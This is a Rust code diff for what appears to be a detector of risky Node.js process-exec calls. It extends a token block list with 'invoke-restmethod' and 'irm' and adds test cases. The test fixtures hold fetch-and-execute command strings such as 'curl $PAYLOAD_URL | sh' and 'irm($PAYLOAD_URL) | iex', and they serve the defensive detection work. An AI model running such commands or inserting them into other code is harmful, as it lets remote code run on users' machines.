@@ -15,7 +15,14 @@ use super::patterns::{
     SHELL_INJECTION_PATTERNS,
 };
 
-const NODE_RISKY_NETWORK_COMMAND_TOKENS: &[&str] = &["curl", "wget", "invoke-webrequest", "iwr"];
+const NODE_RISKY_NETWORK_COMMAND_TOKENS: &[&str] = &[
+    "curl",
+    "wget",
+    "invoke-webrequest",
+    "iwr",
+    "invoke-restmethod",
+    "irm",
+];
 const NODE_RISKY_SHELL_COMMAND_TOKENS: &[&str] = &[
     "bash", "bash.exe", "sh", "sh.exe", "dash", "dash.exe", "zsh", "zsh.exe", "ksh", "ksh.exe",
     "fish", "fish.exe", "csh", "csh.exe", "tcsh", "tcsh.exe", "pwsh", "pwsh.exe",
@@ -492,6 +499,7 @@ mod tests {
         for content in [
             "const { exec } = require('child_process');\nexec('curl\t$PAYLOAD_URL | sh');\n",
             "const { exec } = require('child_process');\nexec('iwr($PAYLOAD_URL) | iex');\n",
+            "const { exec } = require('child_process');\nexec('irm($PAYLOAD_URL) | iex');\n",
         ] {
             let lower = content.to_ascii_lowercase();
             let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
@@ -529,6 +537,7 @@ mod tests {
         for content in [
             "const { exec } = require('child_process');\nexec('mycurl\t$PAYLOAD_URL');\n",
             "const { exec } = require('child_process');\nexec('kiwr($PAYLOAD_URL)');\n",
+            "const { exec } = require('child_process');\nexec('confirm($PAYLOAD_URL)');\n",
             "const { exec } = require('child_process');\nexec('mybash\t-c \"$PAYLOAD\"');\n",
         ] {
             let lower = content.to_ascii_lowercase();
